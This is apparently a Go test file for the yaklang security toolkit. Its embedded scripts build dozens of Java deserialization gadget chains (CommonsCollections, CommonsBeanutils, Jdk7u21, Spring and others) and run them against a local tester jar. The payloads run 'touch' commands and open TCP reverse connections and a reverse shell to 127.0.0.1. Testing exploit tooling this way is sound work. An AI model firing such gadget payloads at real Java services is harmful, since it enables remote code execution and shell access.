package yaktest

import (
	"testing"

	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/yak"
)

var ysoTestCode = `
failedGadgets = []
extArgsMap = {
	"CommonsBeanutils2_183":"org.apache.commons.beanutils.BeanComparator:cb183",
	"CommonsBeanutils1_183":"org.apache.commons.beanutils.BeanComparator:cb183",
	"CommonsCollections1":"sun.reflect.annotation.AnnotationInvocationHandler:AnnotationInvocationHandler_7u21,sun.reflect.annotation.AnnotationInvocationHandler$1:AnnotationInvocationHandler$1_7u21",
	"Jdk7u21":"sun.reflect.annotation.AnnotationInvocationHandler:AnnotationInvocationHandler_7u21,sun.reflect.annotation.AnnotationInvocationHandler$1:AnnotationInvocationHandler$1_7u21",
	"Jdk8u20":"sun.reflect.annotation.AnnotationInvocationHandler:AnnotationInvocationHandler_8u20,sun.reflect.annotation.AnnotationInvocationHandler$1:AnnotationInvocationHandler$1_8u20,java.beans.beancontext.BeanContextSupport:BeanContextSupport,java.beans.beancontext.BeanContextSupport$1:BeanContextSupport$1,java.beans.beancontext.BeanContextSupport$2:BeanContextSupport$2,java.beans.beancontext.BeanContextSupport$BCSChild:BeanContextSupport$BCSChild,java.beans.beancontext.BeanContextSupport$BCSIterator:BeanContextSupport$BCSIterator",
	"Spring2":"sun.reflect.annotation.AnnotationInvocationHandler:AnnotationInvocationHandler_7u21,sun.reflect.annotation.AnnotationInvocationHandler$1:AnnotationInvocationHandler$1_7u21",
	"Spring1":"sun.reflect.annotation.AnnotationInvocationHandler:AnnotationInvocationHandler_7u21,sun.reflect.annotation.AnnotationInvocationHandler$1:AnnotationInvocationHandler$1_7u21",
	"CommonsCollections3":"sun.reflect.annotation.AnnotationInvocationHandler:AnnotationInvocationHandler_7u21,sun.reflect.annotation.AnnotationInvocationHandler$1:AnnotationInvocationHandler$1_7u21",
}
transformChianGadgets = ["CommonsCollections1","CommonsCollections5","CommonsCollections6","CommonsCollections6Lite","CommonsCollections7","CommonsCollections9","CommonsCollectionsK3"]
for gadgetName in transformChianGadgets{
	try {
		extArg = ""
		if extArgsMap[gadgetName] != nil{
			extArg = "=/tmp/classes,"+extArgsMap[gadgetName]
		}
		randomstr = str.RandStr(8)
		path = "/tmp/%s" % randomstr
		gadgetIns = yso.GetGadget(gadgetName,"raw_cmd","touch "+path)~
		payload1 = yso.ToBytes(gadgetIns)~
		payload = yso.ToBytes(gadgetIns,yso.threeBytesCharString(),yso.dirtyDataLength(10000))~
		assert len(payload) - len(payload1) > 10000
		payloadBase64 = codec.EncodeBase64(payload)~
		cmd = "/Library/Java/JavaVirtualMachines/zulu-8.jdk/Contents/Home/bin/java '-javaagent:/tmp/yak-yso-tester-loader.jar%s' -jar /tmp/yak-yso-tester.jar '%s'"%[extArg,payloadBase64]
		exec.System(cmd)
		if !file.IsExisted(path){
			panic("not found file")
		}
		file.Remove(path)
		log.info("gadget %s exec test success",gadgetName)
	} catch e {
		log.error("gadget %s exec test failed: %v", gadgetName,e)
		failedGadgets.Append(gadgetName)
	}
}
println("="*50)
for gadgetName in ["CommonsCollections6"]{
	try {
		extArg = ""
		if extArgsMap[gadgetName] != nil{
			extArg = "=/tmp/classes,"+extArgsMap[gadgetName]
		}
		randomstr = str.RandStr(8)
		path = "/tmp/%s" % randomstr
        content = yso.GenerateClass(yso.useRuntimeExecTemplate(),yso.command("touch "+path))~
        payload = yso.ToBytes(content)~
		gadgetIns = yso.GetGadget(gadgetName,"mozilla_defining_class_loader",codec.EncodeBase64(payload))~
		payload1 = yso.ToBytes(gadgetIns)~
		payload = yso.ToBytes(gadgetIns,yso.threeBytesCharString(),yso.dirtyDataLength(10000))~
		assert len(payload) - len(payload1) > 10000
		payloadBase64 = codec.EncodeBase64(payload)~
		cmd = "/Library/Java/JavaVirtualMachines/zulu-8.jdk/Contents/Home/bin/java '-javaagent:/tmp/yak-yso-tester-loader.jar%s' -jar /tmp/yak-yso-tester.jar '%s'"%[extArg,payloadBase64]
		exec.System(cmd)
		if !file.IsExisted(path){
			panic("not found file")
		}
		file.Remove(path)
		log.info("gadget %s load_class test success",gadgetName)
	} catch e {
		log.error("gadget %s exec test failed: %v", gadgetName,e)
		failedGadgets.Append(gadgetName)
	}
}
println("="*50)
templateGadgetNames = ["CommonsCollectionsK1","CommonsCollectionsK2","Jdk7u21","CommonsCollections8","MozillaRhino2","JSON1","CommonsBeanutils1","Click1","Spring2","CommonsCollections10","CommonsBeanutils2","CommonsBeanutils1_183","JavassistWeld1","CommonsCollections11","Spring1","CommonsCollections3","Jdk8u20","CommonsCollections2","JBossInterceptors1","MozillaRhino1","ROME","CommonsBeanutils2_183","CommonsCollections4","Hibernate1","Vaadin1"]
//templateGadgetNames = ["CommonsCollections8"]
for gadgetName in templateGadgetNames{
	try{
		extArg = ""
		if extArgsMap[gadgetName] != nil{
			extArg = "=/tmp/classes,"+extArgsMap[gadgetName]
		}
		randomstr = str.RandStr(8)
		path = "/tmp/%s" % randomstr
		gadgetIns = yso.GetGadget(gadgetName,"RuntimeExec","touch "+path)~
		payload1 = yso.ToBytes(gadgetIns)~
		payload = yso.ToBytes(gadgetIns,yso.twoBytesCharString(),yso.dirtyDataLength(10000))~
		assert len(payload) - len(payload1) > 10000
		payloadBase64 = codec.EncodeBase64(payload)~
		cmd = "/Library/Java/JavaVirtualMachines/zulu-8.jdk/Contents/Home/bin/java '-javaagent:/tmp/yak-yso-tester-loader.jar%s' -jar /tmp/yak-yso-tester.jar '%s'"%[extArg,payloadBase64]
		exec.System(cmd)
		if !file.IsExisted(path){
			panic("not found file")
		}
		file.Remove(path)
		log.info("gadget %s exec test success",gadgetName)
	}catch e{
		log.error("gadget %s exec test failed: %v", gadgetName,e)
		failedGadgets.Append(gadgetName)
	}
}
reportFailedGadget(failedGadgets)
`

func TestGadgetBaseExternalJarTool(t *testing.T) {
	_, err := yak.Execute(ysoTestCode, map[string]any{
		"reportFailedGadget": func(gs any) {
			failedGadgets := utils.InterfaceToSliceInterface(gs)
			if len(failedGadgets) > 0 {
				t.Fatalf("failed gadgets: %v", failedGadgets)
			}
		},
	})
	if err != nil {
		t.Fatal(err)
	}
}

const classTestCode = `
execPayload = (arg...) => {
	gadgetIns = yso.GetGadget("CommonsBeanutils1",arg...)~
	payload = yso.ToBytes(gadgetIns,yso.twoBytesCharString())~
	payloadBase64 = codec.EncodeBase64(payload)~
	cmd = "/Library/Java/JavaVirtualMachines/zulu-8.jdk/Contents/Home/bin/java '-javaagent:/tmp/yak-yso-tester-loader.jar' -jar /tmp/yak-yso-tester.jar '%s'"%[payloadBase64]
	exec.System(cmd)
	//println(cmd)
}
allTestCase = {}
pushTestCase = (name,f) => {
	allTestCase[name] = ()=>{
		res = f()
		if res == nil{
			res = false
		}
		return res
	}
}
pushTestCase("dnslog",()=>{
	domain,token = risk.NewDNSLogDomain()~
	execPayload(yso.useDNSLogEvilClass(domain))
	_,err =risk.CheckDNSLogByToken(token, 3)
	return err == nil
})
pushTestCase("RuntimeExec",()=>{
	randomstr = str.RandStr(8)
	path = "/tmp/%s" % randomstr
	execPayload(yso.useRuntimeExecEvilClass("touch "+path))
	if file.IsExisted(path){
		file.Remove(path)
		return true
	}
	return false
})
pushTestCase("ProcessBuilderExec",()=>{
	randomstr = str.RandStr(8)
	path = "/tmp/%s" % randomstr
	execPayload(yso.useProcessBuilderExecEvilClass("touch "+path))
	if file.IsExisted(path){
		file.Remove(path)
		return true
	}
	return false
})
pushTestCase("ProcessImplExec",()=>{
	randomstr = "ProcessImplExec_"+str.RandStr(8)
	path = "/tmp/%s" % randomstr
	execPayload(yso.useProcessImplExecEvilClass("touch "+path))
	if file.IsExisted(path){
		file.Remove(path)
		return true
	}
	return false
})
pushTestCase("TcpReverse",()=>{
	host = "127.0.0.1"
	port = os.GetRandomAvailableTCPPort()
	token = str.RandStr(8)
	recvToken = ""
	go tcp.Serve(host, port, tcp.serverCallback(conn=>{
		conn.SetTimeout(3)
		byt = conn.Recv()~
		recvToken = str.TrimSpace(string(byt))
	}))
	execPayload(yso.useTcpReverseEvilClass(host,port),yso.tcpReverseToken(token))
	sleep(1)
	recvToken = recvToken[2:]
	return recvToken == token
})
pushTestCase("TcpReverseShell",()=>{
	host = "127.0.0.1"
	port = os.GetRandomAvailableTCPPort()
	recvToken = ""
	ctx,cancel = context.WithCancel(context.Background())
	go tcp.Serve(host, port, tcp.serverCallback(conn=>{
		conn.Send("echo -n 'hello'|md5|cut -d ' ' -f1\n")
		conn.SetTimeout(1)
		byt = conn.Recv()~
		conn.Close()
		recvToken = str.TrimSpace(string(byt))
		cancel()
	}),tcp.serverContext(ctx))
	go fn{
		execPayload(yso.useTcpReverseShellEvilClass(host,port))
	}
	<-ctx.Done()
	return str.Contains(recvToken,"348bda8e6bc630f8c6ea046c99489b92")
})
pushTestCase("Sleep",()=>{
	start = time.Now()
	sleepTime = 3000
	execPayload(yso.useSleepTime(sleepTime),yso.useSleepTemplate())
	du = time.Since(start)
	du = int(du)/1000/1000
	return du >= sleepTime
})

swg = sync.NewSizedWaitGroup(10)
for name,f in allTestCase{
	name := name
	f := f
	swg.Add()
	go fn{
		defer swg.Done()
		if f(){
			log.info("test case %s success",name)
		}else{
			log.error("test case %s failed",name)
		}
	}
}
swg.Wait()


// TODO: build a jar for auto test web env
// ModifyTomcatMaxHeaderSize 
//execPayload(yso.useModifyTomcatMaxHeaderSizeTemplate())
`

func TestClassesBaseExternalJarTool(t *testing.T) {
	_, err := yak.Execute(classTestCode, map[string]any{
		"reportFailedGadget": func(gs any) {
			failedGadgets := utils.InterfaceToSliceInterface(gs)
			if len(failedGadgets) > 0 {
				t.Fatalf("failed gadgets: %v", failedGadgets)
			}
		},
	})
	if err != nil {
		t.Fatal(err)
	}
}
